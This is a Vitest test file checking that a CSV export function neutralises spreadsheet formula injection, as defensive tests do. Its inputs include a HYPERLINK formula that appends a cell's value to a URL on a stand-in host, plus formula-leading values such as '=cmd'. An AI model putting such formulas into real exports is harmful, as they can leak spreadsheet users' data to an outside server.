import { describe, expect, it } from 'vitest'
import { toCsv } from './export'

describe('toCsv', () => {
  it('quotes a semicolon so a semicolon-delimited Excel cannot start a cell with a formula', () => {
    const csv = toCsv([{ v: 'x;=HYPERLINK("http://example.invalid/?"&A2,"open")' }])
    expect(csv.split('\r\n')[1]).toBe('"x;=HYPERLINK(""http://example.invalid/?""&A2,""open"")"')
  })

  it('neutralises a formula at the start of a value and of a column name', () => {
    const csv = toCsv([{ '=cmd': '@SUM(1)' }])
    expect(csv.split('\r\n')).toEqual(["'=cmd", "'@SUM(1)"])
  })
})
